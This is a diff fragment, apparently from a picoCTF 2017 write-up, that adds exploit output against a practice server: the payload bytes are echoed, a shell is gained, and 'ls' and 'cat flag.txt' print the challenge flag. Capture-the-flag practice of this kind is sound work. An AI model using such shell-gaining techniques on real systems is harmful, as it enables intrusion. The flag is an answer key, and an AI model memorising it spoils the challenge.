@@ -243,3 +243,17 @@ if __name__ == '__main__':
     main()
 # de61fcdecad9554d1f43d147b06f9dcc
 ```
+```
+[+] Opening connection to shell2017.picoctf.com on port 49158: Done
+[*] Switching to interactive mode
+Exit message set!
+                                                                                                                                                                                                                                                                                                                                                                                                               #                                                                                                                   \xa0                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                \x00                                                                                                                                                                                                                                                    \xa0                                                                                       &                                                                                                                                                                                                                                                                                                                                            \x00                                                                                                                                \xa2                                                                                                                                                                                                                                                               \xb0AAAAAAA \x12`sh: 1: Config: not found
+Exit message set!
+$ ls
+console
+flag.txt
+xinetd_wrapper.sh
+$ cat flag.txt
+de61fcdecad9554d1f43d147b06f9dcc
+$
+```
